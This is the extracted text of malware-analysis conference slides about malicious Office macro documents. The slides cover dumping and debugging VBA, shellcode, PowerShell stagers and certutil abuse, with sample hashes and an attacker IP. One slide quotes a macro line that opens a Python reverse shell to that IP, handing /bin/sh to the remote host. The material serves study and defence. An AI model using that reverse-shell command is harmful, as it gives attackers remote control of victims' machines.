Still Breaching Your Perimeter
A DEEP DIVE INTO MALICIOUS OFFICE DOCUMENTS
Dr. Josh Stroschein
MALWARE ANALYST AND SECURITY RESEARCHER
@jstrosch 0xevilc0de.com

Josh Stroschein - @jstrosch

VDA Labs AppSec + MA

Course Author MA

Assistant Professor MA + RE + VR

Social Engineering and MACROS
Social engineering works - Training is hard - Users need to get stuff done
Microsoft Office - Visual Basic is very powerful
Macros just work - Totally legitimate usage - No patch for a "feature"
When 1 macro is executed - Attackers have a beachhead

Basic Concept of Operations

Office Document

Macros

Additional Stages N

Malware

PostInfection

macros
Office documents can contain embedded code - Written in VBA - Visual Basic for Applications - Can also access Windows API - more on that later
How do we view macros then? - Dump them using oledump (Thank you Mr Stevens!) - View in Office IDE (Developer)

index macros
size

oledump

stream name

oledump

Office IDE
You can enable Developer tools in MS Office
Project Macros
User Form

Debugging
You can debug now - sometimes easier than trying to manually reverse the obfuscation

Runtime Analysis

Sometimes Encounter Passwords

Social Engineering abounds

Use of Forms

Embedded Content

Obfuscation

Windows API

shellcode
Sample MD5: b107f3235057bb2b06283030be8f26e4

shellcode

Shellcode

process hollowing - DEMO
https://youtu.be/oM2R2_5wo7Q

Powershell
Sample: 9216418c98d47981f773fc2525fa568f

Powershell

powershell

powershell

shellcode

staged in
memory

Powershell
Shellcode attempts to download content from: hxxp://37.28.154.204/FIC7S
- Executes it - Unavailable (i.e. 404) at time of analysis

VB Scripts
Sample: c1aaa74ba09c523c32b49e78cf0b2397

VBS

VBS
Drops Two Files:

Cert Util
Sample: 16eb1828b27feb9dd470eb018be39d0a

Cert util
https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx

31
scriptToRun = "do shell script ""python -c 'import ... s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\""37.28.154.204\"",446)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call([\""/bin/sh\"",\""... res = MacScript(scriptToRun)
mac shell
from our PowerShell doc: 9216418c98d47981f773fc2525fa568f

Thank You!
You will find these slides: 0xevilc0de.com/hitb_ams_18.zip

